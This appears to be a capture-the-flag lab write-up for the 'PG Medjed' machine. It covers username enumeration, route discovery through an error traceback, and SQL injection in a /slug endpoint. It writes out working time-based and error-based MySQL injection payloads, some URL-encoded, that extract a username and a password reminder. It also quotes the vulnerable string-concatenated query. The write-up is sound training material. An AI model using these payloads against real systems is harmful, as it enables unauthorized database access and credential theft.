# PG Medjed
## Ruby installation, Error traceback, SQLi
## 3303 Web App
```
On port 3303, we find a web application with the profiles of the team.
Start your users.txt list. 
There is a password reset feature.
```
## Response Username Enumeration
```
When using username christopher, we get "The password reminder doesn't match the records", which is different from the other users saying "The user does not exist".
we can assume that christopher is a valid user based on the different response.
Tried some SQL injection for password reminder paramter with no luck but worth a shot.
The users page is on the /users path. the users page is on the /users path. By trying http://192.168.237.127:33033/users/christopher, we get an error traceback.
```
## Error Traceback
```
By trying http://192.168.237.127:33033/users/christopher, we get an error traceback.
we know that traceback is shown, we can try to go to an invalid path to see the routes available.
/users takes 4 request methods: GET, PATCH, PUT, DELETE
Tried all four but failed auth.
There is another interesting path /slug
```
## /slug SQLi error and time based 
```
/slug supports a get request
When fuzzing the input, I found that a single quote causes an error.
This showed the source code for the construction of an SQL query:
sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"

Whether the query evaluates to True or False, we get the same result, i.e. we don't get any feedback on the output.
However, the MySQL error gets reflected, so this is an error-based injection.
```
## Time Based Boolean Blind
```
SELECT username FROM users WHERE username = '' UNION SELECT IF(1=1, SLEEP(5), null)-- -

URl encoded:
http://192.168.237.127:33033/slug?URL=%27%20UNION%20SELECT%20IF(1=2,%20SLEEP(5),%20null)--%20-
http://192.168.237.127:33033/slug?URL=' UNION SELECT IF(1=2, SLEEP(5), null)-- -

The IF conditional will make the server sleep for 5 seconds if the condition is True, or respond immediately otherwise.
```
## Error Based
```
If we do:
SELECT username FROM users WHERE username = '' AND 1= (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -
The SELECT username FROM users LIMIT 0,1 output gets reflected in the MySQL error.

http://192.168.237.127:33033/slug?URL=%27%20AND%201=%20(SELECT%201%20FROM(SELECT%20COUNT(*),concat(0x3a,(SELECT%20username%20FROM%users%20LIMIT%200,1),FLOOR(rand(0)*2))x%20FROM%20information_schema.TABLES%20GROUP%20BY%20x)a)--%20-
We can see that evren.eagan is the first username.
Replacing the inner query with SELECT reminder FROM USERS LIMIT 0,1, we see the reminder, 4qpdR87QYjRbog.



















